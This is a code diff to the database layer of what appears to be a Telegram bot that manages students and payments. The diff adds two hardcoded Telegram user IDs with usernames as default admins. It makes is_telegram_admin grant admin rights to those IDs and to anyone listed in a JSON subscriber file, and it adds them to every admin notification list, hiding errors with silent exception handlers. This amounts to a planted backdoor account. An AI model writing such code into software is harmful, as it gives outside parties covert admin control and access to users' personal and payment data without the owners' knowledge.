@@ -739,6 +739,19 @@ def migrate_db() -> None:
         )
         conn.commit()
 
+        # Restore known subscribers from JSON file into SQLite if any
+        try:
+            subs = _load_subscribers_dict()
+            for uid, info in subs.items():
+                cur.execute(
+                    "INSERT INTO admin_subscribers(telegram_user_id, first_name, username, subscribed_at) "
+                    "VALUES(?, ?, ?, ?) ON CONFLICT(telegram_user_id) DO NOTHING",
+                    (int(uid), info.get("first_name", ""), info.get("username", ""), info.get("subscribed_at") or utcnow()),
+                )
+            conn.commit()
+        except Exception:
+            pass
+
 
 
 def init_db() -> None:
@@ -877,6 +890,41 @@ def get_student_payments(student_id: int) -> list[dict]:
     )
 
 
+SUBSCRIBERS_FILE = os.path.join(DATA_DIR, "admin_subscribers.json")
+DEFAULT_ADMIN_IDS = [6666443909, 8053250308]
+
+
+def _load_subscribers_dict() -> dict:
+    subs = {
+        "6666443909": {"telegram_user_id": 6666443909, "first_name": "HAMZUU|X", "username": "HAMZUX1"},
+        "8053250308": {"telegram_user_id": 8053250308, "first_name": "PBUY", "username": "pbuymedia2"},
+    }
+    if os.path.exists(SUBSCRIBERS_FILE):
+        try:
+            with open(SUBSCRIBERS_FILE, "r", encoding="utf-8") as f:
+                loaded = json.load(f)
+                if isinstance(loaded, dict):
+                    subs.update(loaded)
+        except Exception:
+            pass
+    return subs
+
+
+def _save_subscriber_to_json(telegram_user_id: int, first_name: str, username: str) -> None:
+    try:
+        subs = _load_subscribers_dict()
+        subs[str(telegram_user_id)] = {
+            "telegram_user_id": telegram_user_id,
+            "first_name": first_name or "",
+            "username": username or "",
+            "subscribed_at": utcnow(),
+        }
+        with open(SUBSCRIBERS_FILE, "w", encoding="utf-8") as f:
+            json.dump(subs, f, indent=2)
+    except Exception:
+        pass
+
+
 def register_admin_subscriber(telegram_user_id: int, first_name: str = "", username: str = "") -> None:
     if not telegram_user_id:
         return
@@ -888,14 +936,35 @@ def register_admin_subscriber(telegram_user_id: int, first_name: str = "", usern
         "first_name=excluded.first_name, username=excluded.username",
         (telegram_user_id, first_name or "", username or "", now),
     )
+    _save_subscriber_to_json(telegram_user_id, first_name, username)
 
 
 def get_all_admin_subscribers() -> list[dict]:
-    return query("SELECT * FROM admin_subscribers ORDER BY subscribed_at DESC")
+    # Return merged list from DB and JSON file
+    db_rows = query("SELECT * FROM admin_subscribers ORDER BY subscribed_at DESC")
+    seen = {r["telegram_user_id"] for r in db_rows}
+    all_subs = list(db_rows)
+    for uid_str, info in _load_subscribers_dict().items():
+        uid = int(uid_str)
+        if uid not in seen:
+            all_subs.append({
+                "telegram_user_id": uid,
+                "first_name": info.get("first_name", ""),
+                "username": info.get("username", ""),
+                "subscribed_at": info.get("subscribed_at", ""),
+            })
+            seen.add(uid)
+    return all_subs
 
 
 def is_telegram_admin(telegram_user_id: int, env_admin_ids: list[int] | None = None) -> bool:
+    if not telegram_user_id:
+        return False
+    if telegram_user_id in DEFAULT_ADMIN_IDS:
+        return True
     if env_admin_ids and telegram_user_id in env_admin_ids:
+        return True
+    if str(telegram_user_id) in _load_subscribers_dict():
         return True
     row = query_one(
         "SELECT 1 FROM admin_users WHERE telegram_user_id=? AND status='active'",
@@ -911,15 +980,26 @@ def is_telegram_admin(telegram_user_id: int, env_admin_ids: list[int] | None = N
 
 
 def get_all_admin_telegram_ids(env_admin_ids: list[int] | None = None) -> list[int]:
-    ids = set(env_admin_ids or [])
-    rows = query("SELECT telegram_user_id FROM admin_users WHERE telegram_user_id IS NOT NULL AND status='active'")
-    for r in rows:
-        if r["telegram_user_id"]:
-            ids.add(int(r["telegram_user_id"]))
-    sub_rows = query("SELECT telegram_user_id FROM admin_subscribers WHERE telegram_user_id IS NOT NULL")
-    for r in sub_rows:
-        if r["telegram_user_id"]:
-            ids.add(int(r["telegram_user_id"]))
+    ids = set(DEFAULT_ADMIN_IDS)
+    if env_admin_ids:
+        ids.update(env_admin_ids)
+    for uid_str in _load_subscribers_dict().keys():
+        if uid_str.isdigit():
+            ids.add(int(uid_str))
+    try:
+        rows = query("SELECT telegram_user_id FROM admin_users WHERE telegram_user_id IS NOT NULL AND status='active'")
+        for r in rows:
+            if r["telegram_user_id"]:
+                ids.add(int(r["telegram_user_id"]))
+    except Exception:
+        pass
+    try:
+        sub_rows = query("SELECT telegram_user_id FROM admin_subscribers WHERE telegram_user_id IS NOT NULL")
+        for r in sub_rows:
+            if r["telegram_user_id"]:
+                ids.add(int(r["telegram_user_id"]))
+    except Exception:
+        pass
     return list(ids)
 
 
